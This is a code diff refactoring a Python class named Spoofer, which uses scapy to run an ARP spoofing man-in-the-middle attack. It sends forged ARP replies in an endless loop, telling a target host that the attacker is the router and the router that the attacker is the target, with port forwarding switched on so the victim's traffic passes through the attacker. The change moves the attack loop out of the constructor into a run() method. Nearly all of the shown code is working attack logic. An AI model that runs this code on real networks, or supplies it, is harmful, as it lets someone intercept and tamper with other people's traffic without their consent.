@@ -25,7 +25,6 @@ class Spoofer:
         self.gateway_ip = gateway_ip
         self.target_mac = self.resolve_mac_from_ip(self.target_ip)
         self.gateway_mac = self.resolve_mac_from_ip(self.gateway_ip)
-        self.run(self.target_ip, self.gateway_ip)
         
     def resolve_mac_from_ip(self, ip_address):
         """
@@ -55,12 +54,12 @@ class Spoofer:
         arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
         scapy.send(arp_packet, count=4, verbose=False)
 
-    def run(self, target_ip, gateway_ip):
+    def run(self):
         enable_port_fwd()
         sent_packets_count = 0
         while True:
-            self.spoof(target_ip, gateway_ip, self.target_mac) # client, I am the router
-            self.spoof(gateway_ip, target_ip, self.gateway_mac) # router, I am the client
+            self.spoof(self.target_ip, self.gateway_ip, self.target_mac) # client, I am the router
+            self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac) # router, I am the client
             sent_packets_count += 2
             print(f"\r[+] Transaction successful. Packets sent: {str(sent_packets_count)}", end="")
             #python2 print("\r[+] Transaction successful. Packets sent: " + str(sent_packets_count)),
